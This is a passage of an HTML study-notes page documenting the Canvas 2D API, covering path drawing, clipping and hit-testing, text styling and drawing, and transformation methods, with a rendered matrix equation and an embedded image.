<ul><li>and the sub-path is marked as closed</li></ul></li></ul></li> <li><p>Drawing paths</p> <ul><li><code>CanvasRenderingContext2D.fill(fillRule?)</code>, <code>CanvasRenderingContext2D.fill(path: Path2D, fillRule?)</code> <ul><li>fillRule: The algorithm by which to determine if a point is inside a path or outside a path
<ul><li><code>&quot;nonzero&quot;</code>: The non-zero winding rule, which is the default rule.</li> <li><code>&quot;evenodd&quot;</code>: The even-odd winding rule.</li> <li><a href="https://en.wikipedia.org/wiki/Nonzero-rule" target="_blank" rel="noopener noreferrer">wikipedia<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li></ul></li></ul></li> <li><code>CanvasRenderingContext2D.stroke(path?: Path2D): void</code> — Strokes the sub-paths with the current stroke style</li> <li><code>CanvasRenderingContext2D.drawFocusIfNeeded(element: Element): void</code>,<br> <code>CanvasRenderingContext2D.drawFocusIfNeeded(path: Path2D, element)</code> — If a given element is focused, this method draws a focus ring around the current path</li> <li><code>CanvasRenderingContext2D.scrollPathIntoView(fillRule?)</code><br> <code>CanvasRenderingContext2D.scrollPathIntoView(path, fillRule?)</code> — Scrolls the current path or a given path into the view.
<ul><li>experimental</li></ul></li> <li><code>CanvasRenderingContext2D.clip()</code> — Creates a clipping path from the current sub-paths
<ul><li>Everything drawn after <code>clip()</code> is called appears inside the clipping path only</li> <li>Everything that falls outside of this path won't get drawn on the canvas</li></ul></li> <li><code>CanvasRenderingContext2D.isPointInPath(x, y, fillRule?): boolean</code><br> <code>CanvasRenderingContext2D.isPointInPath(path, x, y, fillRule?)</code> — Reports whether or not the specified point is contained in the current path</li> <li><code>CanvasRenderingContext2D.isPointInStroke(x, y): boolean</code><br> <code>CanvasRenderingContext2D.isPointInStroke(path, x, y)</code> — Reports whether or not the specified point is inside the area contained by the stroking of a path
<ul><li>stroke has width</li> <li>no IE support</li></ul></li></ul></li></ol> <h4 id="text-drawing"><a href="#text-drawing" class="header-anchor">#</a> Text Drawing</h4> <ol><li><p>Text styles</p> <ul><li><code>CanvasRenderingContext2D.font</code> — Font setting. CSS <code>font</code> value. Default value <code>10px sans-serif</code></li> <li><code>CanvasRenderingContext2D.textAlign</code> — Text alignment setting. Possible values: <code>start</code> (default), <code>end</code>, <code>left</code>, <code>right</code> or <code>center</code></li> <li><code>CanvasRenderingContext2D.textBaseline</code> — Baseline alignment setting. Possible values: <code>top</code>, <code>hanging</code>, <code>middle</code>, <code>alphabetic</code> (default), <code>ideographic</code>, <code>bottom</code><br> <img src="/notes-of-tan/assets/img/9.cc6d18e9.png" alt=""></li> <li><code>CanvasRenderingContext2D.direction</code> — text direction. Possible values: <code>ltr</code>, <code>rtl</code>, <code>inherit</code> (default)</li></ul></li> <li><p>Drawing text</p> <ul><li><code>CanvasRenderingContext2D.fillText(text, x, y, maxWidth?): void</code> — Draws (fills) a given text at the given (x,y) position
<ul><li>maxWidth<br> <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAQcAAABdCAYAAACoyaOCAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAABVQSURBVHhe7Z37q1XF+8f7B/rl81s/hD+FhEREhJFESVGBUgppSWkmWpmSqFnmJTVJTDFDI9QiFAtFU+yC4i0L0zIrCaWLlZaZWWaUZRld5strvudZzX7OrNucffSc9vOCYe91mVmz1prnPfdZ5znDMIwIJg6GYUQxcTAMI0qniMN7773nNmzY0LbVfrsr8OOPP7rFixe733//vW1PI10xzoZxNmm6OBw9etTdcsst7oUXXohudwXOnDnj5syZ4+69917322+/te39l64YZ8M42zSIw2OPPebOO+8872688Ub3ww8/+P38si3HioxGwpBz9HZX4K233vJxyhOHrhhnwzjbNIjD33//7YvaQ4YM8cXukK+++sr17dvXrVmzxv3zzz9te9vz119/uUceeSQzLL3dVdiyZUuuOHTVOBvG2aRdtQKDwDAwkBCMCGMi1y2DnDc0LL3dFeA+8sQBumKcDeNs0k4cMBoMQ2PiYBithYmDiYNhRDFxMHEwjCgmDiYOhhHFxMHEwTCimDiYOBhGFBMHEwfDiNIhcfjzzz/dvHnzXP/+/d2RI0fa9paLA4OoVq1a5S688EL/WzSoKmTr1q25xgxvvvmm69Wrl48TcRM+/PBD9+qrr7q9e/e6hx56yM+niInDr7/+6saMGeP9T5s2zcTBaGk6JA4Y3cUXX+yHGi9YsCAz8jJxOHTokOvdu7f316dPH3f48OG2I/+PXIvjOLnm6tWr3alTpxqGc0u4jOgcOHCg39ejRw8vBCDzJFauXOlmz56dCUJMHJhodf7557sLLrjA9ezZ08TBaGmSxQEhmDt3rtu+fbvbtWuXN0wZcl0mDs8//7zbuHGj++ijj7xIrFu3ru3Ivxw8eNAf4zzg+oQj8z2+/PJLN2LECHfixAm/vW3bNrdkyRL3zTffeDEQscIPgrFo0SJ366235ooDpYZHH33U7dixw/Xr169BeAyjFUkWB4xy4sSJ7qeffvK5+ejRo93HH3/sjxWJA+GQg+Mf4+X/+PHj3R9//OGPC4Q5dOjQ7HpcZ+TIke6zzz7z24jE/PnzvT/CWbhwofvkk0/8Ma6FEOCHYzNmzHCTJ092l19+ea447Nmzx7388sv+P0JDCcLEwWhlouJArpnnxFhZ72D69Ol+DoYYoBwrEgdyfOr0MneDCVDk1HqilxYjxGDw4MGZALFNCQQQAa6BoADVHSaJiZBw7P7773e7d+92U6dObScOWlykimLiYLQyyeJALvvkk0/6/7BixYrMmIrEAVFh5qegDVkQwRF/GO6ll16aXZ9tWYwFwaEEIqUPqhaE+fbbb/ttEYeTJ0+6pUuXthMHRAXREIHS1zaMViS5WhGKAfBftovEgZJCeEwbckjo75133vENhVL0RxwQGkBgnnjiCf8fpEpCAyYQhr6nUByIA6Ug/gv6Hgyj1UgWB208oQHqY+E2vwiEID0PEm4I57JiE3CcLlMJB7EQceAYjZGCxDW8Zngc8CPigNDQGBm2e+h7MIxWI0kcpNjNuAIBQ6oiDhg7YQjakEPCMDdv3uwbIGUbYZA2AkoI2j/nybkc08dDcaDUQrUkJIyzYbQiSeIg/zdt2pTltqEha8MKt/lfVRw4T3oyEIC1a9dmC9EgFt9//70/D7/aP9eR+MSOh+IQu+cwzobRinRIHHRjpfjThhVu858whDJx4Bi9ERyni1EMGmFiP3BM++c6Ep/YcQnbxMEw4jRFHBgTcNNNNzX0DoSGFW7znzCEovUaqTYwnPn48eNu/fr1fvvOO+/0vQr0VBAPwK/2TxuD3EfseCgOlEr0Pet7MIxWo0PiEBp5iDascJv/2l+eISIGt99+u/v00099SYFeheHDh/vFbl955ZW2s+LGz7bcR+x4KA7huUJenAyjVeiQOEi3okYbVrjN/6riQE/GqFGj/PlUKdhGLD744APf5iDgV/tnW+4jdtzEwTCK6ZA45BmPNqxwm/8y/kCI7QMRA44xkYrr3nfffb7UEHaHErZ0eQrhPv6H8YFQHAhL37O+B8NoNc6JOITHwnA1HGP+BjMqqWLQa0HvBcOm9+/f33ZWYylBCK/Db3hNCMWB/4ygDD+Np+NpGK1GkjgA5+jcWtCGpQ01HHZNuGPHjs0GNIXINSdNmuTbG4CwpkyZ4md0CsRJT97iPKn20DhZJg5M6jp9+rQ/VtRIahitQrI4IAyx2ZRQJA4YLAOoGEgFGOSECROyAU0a/DLjU+Y9MGybnpHwfISFc8S4ZZCWxFXHB0JxYPj1gAEDsnEThINYmDgYrUyyOGA4GKmspxBSJA50d95zzz2ZIdOuQJFez8oU8CtGDIjL9ddfnxkyMGmLtgnZx7ms+BTOyiwSB4Tmmmuu8SIBhMM1TByMViZZHPhlIhTrIMDPP//s9u3b5/8XiQMzKDFkqSYwBZtJT7ESCFBSCEsaXFdP8WYw1LBhwxqMe9y4cdkgqTJxkPkdcg4lEdZ+MHEwWpl24oBBVPlWJrkyBkRxHiOk0ZD1EqBIHJgxiSFLOPQU6ElRIfgL2zYQExopiY+g2wgQiVmzZmX3wPURmZBQHGiIpPTCAjEMuHr22Wd9O0h4D4bRajSIA4uy5n1lmxz/6quvdsuXL/df42ZZNQYkyShJ1lqgeM5+xiYwhVrOC7eBBkmMEUN84IEHshw/BpO7QiNFlGbOnNmupEF1g+Xhvv76az+JSro6z5w54x588MEGQaEUgpjRzkCpARAouRfih6AgOPg3jFakQRwwCDEQitliOFLslmNirPzKPlkVKgyD43obDhw4kC1MK7l3HuTweor3smXL2rb+5dixY76dgDBvvvlm99133/n94fXlWoSp90mcGArOcfEXCpNhtBLtqhV1oFRA3X7QoEG+FFAVWdKekkheL0VdKA2wzP0ll1zSMJW8KhKn2267Lbdx1DBaiQ6Jg2EY/11MHAzDiGLiYBhGFBMHwzCimDgYhhHFxMEwjCgmDoZhRDFxMAwjiomDYRhRTBwMw4hi4mAYRhQTB8Mwopg4GIYRxcTBMIwoJg4lMH37xRdfdIMHD3aff/55295yUv0ZrQMLFu3cudPddddd7qWXXmrb27mwnCPpsn///g0ruMcwcQhgpSoWk2ER3IULF7rrrrsuWxRGVrqKkerPaC1++eUXb5AY59ChQ93//ve/LJ10xqJCOl2yIDSLGVVNl+3EIVw5qarDT1U6O/xUyOlZZi52fVy4MlZIqj+jtWCZxFj6ECdrqjYLVjdjlbPYtXBJ4iCgcqwbyfqLOuCpU6f6tRqLlncrg/AJg7Dyws9bkbqzQXFZkzKMUxUjT/VntBZffPGFXwUtTCfNFocQVknbuHFjVmrAdUgcBBZ/veiii7JA+V+0IGxddPgs88YK0+calqdn6X2JV1UjT/VntA6s1s5K55JGcJ0pDoAQIAhyvWuvvTb7PEQepeKgA2U5evlYTDPQ4esP1pwrdLyqGnmqP6N1iBX5O1sc5FMSddJlqTigLqhMnUDr0Nnhp2LiYHQW50IcSIOkxTrpslQcUgKtQ2eHn4qJg9FZmDhUpLPDTyWlGAap/ozWQb6wJmkEZ+IQobPDTyU1Xl31foyuhe7SN3GI0Nnhp5Iar656P0bXwsShAp0dfiqp8eqq92N0LUwcKtDM8Pk+5tKlS/24cRmayi/b7JfvZ1YhNV7Nuh/GwL/22mu+bnrllVdm4XE/hEni2r9/vx941VWRnigGhp0taOzbsWOH/wgyA41k4A+/bLMfQ+TzhynwvBkCzfOfNGmSbz8QDh8+7CZMmOB69uzpr8kw+rz5C80UB+6Fe2aORo8ePXx4/PLN2GeeecYdOXLEnThxona6/E+IA+MiHn744YYRYDGHYfEF7SojO1Pj1dH74fujxDEcd1/kEL7333/fj4JrBozDL3uO4nr37u1H++Wxbt06fx5fUi/6WjmGocPWruw5Ej5zFsQwy9wVV1zhtm7dWiqupJVDhw659evXe6EOw0do+Hg0z3779u2ZYYYuz+ibIQ7E/fXXX29IbzHH+ySdyMercVXSZbcWBx7O2rVrsxc2bNgwt2fPnmzYNb+MwGS/hI8bNWqUO3nypD8nj9R4deR+9u3b52644QbvD3GYNWuWn9EpuZzcz9ixYxsMmP+LFy9Ozg01XCdv6DxxYj5JmRghcsOHD/d+6Nqli7cMDBEjCbuCR48eXfr8yBmHDBniz+dZ8Hx4TpIOeC48R+KuRXfKlCk+rjFIS0UijYHDG2+8ERWGovvuqDh8++23bsSIEd4vJaLly5f7UgoZJQLPXA5GG4fXCF2VdNltxYGcggcgRjJnzpzc3InEMXfu3OwaOBJFkTGlxivVH18GF5EjR2YYdh4yVl4nSO6xWQIBx44d8yNWw2tUnT2IYYXDyJ977rm2I8WcPn3ajRw50vvp16+fN4IiML4+ffr483kePJci4eK58nwlXjhKBHkCISBckydPbvCHgR88eLBdeOKuuuoqL7IxUsUhLCFxvytXrsxN9+zneEy4qqTL2uLQ2a5KpLWxUxIoe7nU4cMSBAm36FP9qUae4g/FlwRGvCiiloEBkEh0CWLVqlVtZ3QcrrFgwYIsfJwUpYvg+PTp0xv8UYooe0cQjpilWlLE8ePHG2bEYghlJRqI5fTz5s0rvS+EMfRD+wLCQqkFkaAkS9rcvHmzLzUUvfsUceD5jRs3zp/Pu+b9V7nfAwcOZAIqrkq67JbisHfv3uzl8pC2bdvWdqQYqQOLIwHnJQh931XiBXX98cIRNzm/rH4ewnmcL35xffv2dUePHm07o+PoEgBrAtC4VQR1dJ2bEkZRaUjASHinlFgoueSBEc6ePTsLf+DAgb66U4WY6FEfL5tQqMUBl5cxIRA8q7x3X1ccdIY4ceLEyukEyIDqjtztdtUKnStVmV0mMNszrIcVJfTU+67rD2ELc/+6LfvaeHFVi/BVwOAwPAm7ipFzfc6lWC3+cBhkUU7HMTH4snsgNwwb2GjErUNMwIoyC9iyZUvD+TwLnn8KdcVBZ4hVqyFCSnruduKgJ2oxRr1K7wPoaxVNP0+97zr+aDAbP358dm7KdPVTp075VYUkDBzb7G8GsVx2yZIlbUfbQ3cxXWjk/LSkh7lVWWlAhAijxXiLQAzCOBVVEWMgAlSRwjDKMhoMMjyfaddMv06hjjjoDDFl5nJKeu524kAikHNxM2bMqFTvAn0tXN5LSb3vOv600FW9hkYbSrOn1evSSZEgS9Vt2bJlfgyArvYUlYzkOmU5uBbEol6BIvTCPOTItPTnocWhSvtLHnXEQTcM084Rjq+oQkp67nbiQK4l5+LodeB8HKtLFaGvhTuX4qDHFKTmRFowcUWJrS5UvaiCSdh5rfDUvWl4DHN+XW3Ka1ORKkWVorqe3JYXnzJ0NRNX1BujxQEDT6WOOOh0knLdlPTc7cRBP9SOunMpDqtXr87Ow9WpIoXEEjlhN4uwLUAc9W+N5Px0K0uOqtssaCegvUAjuWOVXg1tLFXfjYaieZgj44h7HudKHHRDaNXu5JCU9NytxAHD0fPgqzoGs9CSzyAjEuD8+fN9As8zxtT7ruNPv/TUkoPOSXEpCagIXQLQRX9KA7Sgx4xfl/ZijYcSfln3JWgjTS05IFyMpQjDKjL4cyUOCFZ4rolDhJg4dOQFFZF633X8aXGoeg2Nviau2fMZdPuI7umR3oNYF5vuWdDdjtIwW9ZgKWgjTW1ziKWnol6PcyUO+lwThwixl5nSOFOF1Puu40+LQ2oOqK+JK0psKeieFaoP0qUpPRp57QV6PAYlhHBsinQrlnV1CtpIw7jUIZaeigyvq4hDynVT0nO3b3PoSHdSEan3XcdfsxK5ztWb3Vsh6EFk0qVZpb2gqGGSMQ15bRExKCWEXaS4lJKS7vUgfnV6K86WOOhqmfVW5LBixYrsXFxqkbKM1Puu449Sgh4olFJk1MbSzHEOIXnXIc4Y1oYNG9rObE9ew6T0cFRpiBRiS7vTYFq1S1vQ76ruOIezJQ66y7UsnjF0WquSnrudOJCzksPK+bhmjggUUu+7jj9d3MbldfUVobsyO+N5gM5pMXCujdHrdgSNVD10PKWHo0pDpBALq+z6MXQvT9n4Cm2kZ0scYr1RdZ4X6JJblfTc7cRB50C4KrP36qJzyar3XdcfuW340uoUr0EbSrPnVmh0EXfAgAE+/lUESTdM4nfMmDFJbS3hcGIccQjbMaoQVpOIV925FaniEGvrKBIHLco4bKDqKMlYJlQlPXc7cQD9knBVpt3WQRs5deoqL6OuP8Ru0KBB2fm4sunkITJcGX8YSDNnZcaIldyqDHeGWCLFleXYMQiLnpEwHGbdMvu2CtpAU2ZlNlMcyoZ/I77h+biqU/SZBBZmQLgqVZNScdB96M1u7EoxwphB4Zg6y1JdZZCAnn766UJD0vHiP/vKSPFHrqFzwSrTcTn+1FNPZf5Yb6BulaQusZJbHeNu5uSl2FoKVQ0mLLHdcccd/r7K0OJA740sKFOHur0kQGmQUmHoh/izpkneOyd9sHxcr169fIYTfp+zSrosFQeKWl3xW5nhGgihkxWUWF+RlyAwtJpEyHx4zinrGdA5ZNV4pfjjJSJU4apDiMWaNWtylzFj/8qVK7ME3uySUx7ENRwtyfWLisQaPU8gpa0ghBw3XLqN+CxatKjQYMIl3VgPgnUhqqDbCTDwMI1VJdagSkN7GXkrTrEEHFUq6bVDHFn5ipW8sC0WwNFrSFax46g48AC5ECWEsG9bHPs4VjaXIY8wfJb00uHLV7bLwmftRL2IRRWHEbLwZiyHYR8P8vHHH2/nj/o2x5rpT+CZbNq0qSGh4ygN7dy5M0uE5FS8VFm4BmPAWFMSaSph7l/XuLnPsI2k7lTrGLF0gCFgFDGDCQW1bLlAIB2SGenRlOS+GCXV4CrPX9I9xXxt5PTW0O5SFA7+dSZS5Ijf7t27vV9dfcexzFyRHbcTB62OVVydulezw6cKQpGpygMjUdx9993RqgcJPFxVqMxJrpHqLw/ipte8zHPNXly2KuG4ipSeESldlZXe6kA6qLLIMK7q4rKUNKsaori8UhTF/9j5MVdU5Odd79q1y99DzK84xDJs2CadanELHWlYi3xptaK7IEu5o8CXXXZZdtPkxOxDcessTX8uIdGSU5GgWN5cEjwJFfVnP8fLEnergeGw2CylQoRTDJvnR3172rRp7t133y0swXUXqDZRgqP0E6Z3/s+cObMpvXf/GXEwDKO5mDgYhhHFxMEwjCgmDoZhRHDu/wDfLNuo5SHHcwAAAABJRU5ErkJggg==" alt=""> <ul><li>when <code>undefined</code>, no limit</li> <li>else the user agent will adjust the kerning</li></ul></li></ul></li> <li><code>CanvasRenderingContext2D.strokeText(text, x, y, maxWidth?): void</code> — Draws (strokes) a given text at the given (x, y) position</li> <li><code>CanvasRenderingContext2D.measureText(text)</code> — Returns a <code>TextMetrics</code> object
<ul><li>properties of <code>TextMetrics</code> on <a href="https://developer.mozilla.org/en-US/docs/Web/API/TextMetrics#Properties" target="_blank" rel="noopener noreferrer">MDN<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></li> <li><code>TextMetrics.width</code> Read only — Is a double giving the calculated width of a segment of inline text in CSS pixels. It takes into account the current font of the context</li></ul></li></ul></li></ol> <h4 id="transformation-and-state"><a href="#transformation-and-state" class="header-anchor">#</a> Transformation and State</h4> <ol><li><p>Transformations</p> <ul><li><p><code>CanvasRenderingContext2D.rotate(angle)</code> — Adds a rotation to the transformation matrix. The angle argument represents a clockwise rotation angle and is expressed in radians</p></li> <li><p><code>CanvasRenderingContext2D.scale(x, y)</code> — Adds a scaling transformation to the canvas units by x horizontally and by y vertically</p></li> <li><p><code>CanvasRenderingContext2D.translate(x, y)</code> — Adds a translation transformation by moving the canvas and its origin x horizontally and y vertically on the grid</p> <ul><li>not affected by previous translate</li></ul></li> <li><p><code>CanvasRenderingContext2D.transform(m11, m12, m21, m22, dx, dy)</code> — Multiplies the current transformation matrix with the matrix described by its arguments</p> <section><div class="vuepress-eqn"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>x</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msup><mi>y</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mo>=</mo><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>m</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>m</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>d</mi><mi>x</mi></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>m</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>m</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><msub><mi>d</mi><mi>y</mi></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>0</mn></mstyle></mtd><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow><mrow><mo fence="true">[</mo><mtable rowspacing="0.15999999999999992em" columnspacing="1em"><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>x</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mi>y</mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel="0" displaystyle="false"><mn>1</mn></mstyle></mtd></mtr></mtable><mo fence="true">]</mo></mrow></mstyle></mrow><annotation encoding="application/x-tex">
     {\displaystyle {\begin{bmatrix}x'\\y'\\1\end{bmatrix}}={\begin{bmatrix}m_{11}&amp;m_{21}&amp;d_{x}\\m_{12}&amp;m_{22}&amp;d_{y}\\0&amp;0&amp;1\end{bmatrix}}{\begin{bmatrix}x\\y\\1\end{bmatrix}}}
     </annotation></semantics></math></span><span aria-hidden="true" class="katex-html"><span class="base"><span class="strut" style="height:3.6010299999999997em;vertical-align:-1.55002em;"></span><span class="mord"><span class="mord"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span></span></span><span class="mclose"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎦</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎥</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎤</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="minner"><span class="mopen"><span class="delimsizing mult"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.0510099999999998em;"><span style="top:-2.2500000000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎣</span></span></span><span style="top:-2.8099900000000004em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎢</span></span></span><span style="top:-4.05101em;"><span class="pstrut" style="height:3.1550000000000002em;"></span><span class="delimsizinginner delim-size4"><span>⎡</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.55002em;"><span></span></span></span></span></span></span><span class="mord"><span class="mtable"><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-1.8099999999999994em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">0</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.5500000000000007em;"><span></span></span></span></span></span><span class="arraycolsep" style="width:0.5em;"></span><span class="arraycolsep" style="width:0.5em;"></span><span class="col-align-c"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:2.05em;"><span style="top:-4.21em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.0099999999999993em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathdefault">d</span><span 